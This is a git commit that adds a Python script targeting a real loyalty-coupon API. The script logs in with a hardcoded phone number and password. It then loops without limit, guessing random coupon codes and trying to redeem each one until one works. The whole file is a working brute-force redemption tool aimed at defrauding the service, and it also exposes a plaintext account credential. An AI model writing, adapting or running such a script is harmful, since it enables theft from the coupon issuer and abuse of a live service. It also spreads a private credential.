992d7d148eb3adc4061ff0339cd8f0071b01ee3c
ebnelnegm2 <151925235+ebnelnegm2@users.noreply.github.com>
2025-03-18 00:36:20 +0200

    Add files via upload

---
+++ api.py
@@ -0,0 +1,80 @@
+import requests
+import random
+import json
+import time
+from colorama import Fore, Style, init
+
+# Initialize colorama
+init(autoreset=True)
+
+url_login = "https://exonidentityservice.dsquares.com/api/Account/login"
+payload = {
+  "mobileNumber": "01228391607",
+  "password": "Qwer2486##",
+  "DeviceId": None
+}
+
+headers_login = {
+  'User-Agent': "okhttp/4.10.0",
+  'Accept': "application/json, text/plain, */*",
+  'Accept-Encoding': "gzip",
+  'Content-Type': "application/json",
+  'accept-language': "en",
+  'authorization': "Bearer null"
+}
+
+url_burn_coupon = "https://exonidentityservice.dsquares.com/api/couponz/BurnPreGeneratedCoupon"
+
+def generate_coupon():
+    random_number = ''.join([str(random.randint(0, 9)) for _ in range(12)])
+    return f"62{random_number}"
+#620227
+while True:
+    try:
+        response = requests.post(url_login, data=json.dumps(payload), headers=headers_login)
+        response.raise_for_status()  
+        token = response.json()['token']
+        print(f"{Fore.GREEN}{token}{Style.RESET_ALL}")
+    except requests.exceptions.RequestException as e:
+        print(f"{Fore.RED} {e}{Style.RESET_ALL}")
+        continue   
+    
+    headers_burn = {
+        'User-Agent': "okhttp/4.10.0",
+        'Accept': "application/json, text/plain, */*",
+        'Accept-Encoding': "gzip",
+        'accept-language': "en",
+        'authorization': f"Bearer {token}"
+    }
+
+    coupon_number = generate_coupon()
+    params = {
+        'Channel': "MobileApp",
+        'CouponNumber': coupon_number
+    }
+
+    try:
+        response = requests.get(url_burn_coupon, params=params, headers=headers_burn)
+        response.raise_for_status()  
+        response_json = response.json()
+        rr = "https://exonidentityservice.dsquares.com/api/Wallet/GetWalletSummary"
+        headers = {
+  'User-Agent': "okhttp/4.10.0",
+  'Accept': "application/json, text/plain, */*",
+  'Accept-Encoding': "gzip",
+  'accept-language': "en",
+  'authorization': f"Bearer {token}"
+}
+        ff = requests.get(rr, headers=headers)
+
+        if "errorMessage" in response_json:
+            print(f"{Fore.YELLOW}CODE: {coupon_number} - MESSAGE: {response_json['errorMessage']}{Style.RESET_ALL}")
+            print(ff.text)
+        else:
+            print(f"{Fore.GREEN}CODE: {coupon_number} - MESSAGE: {response_json}{Style.RESET_ALL}")
+            break 
+
+    except requests.exceptions.RequestException as e:
+        print(f"{Fore.RED}ERROR: {e}{Style.RESET_ALL}")
+
+    time.sleep(0)
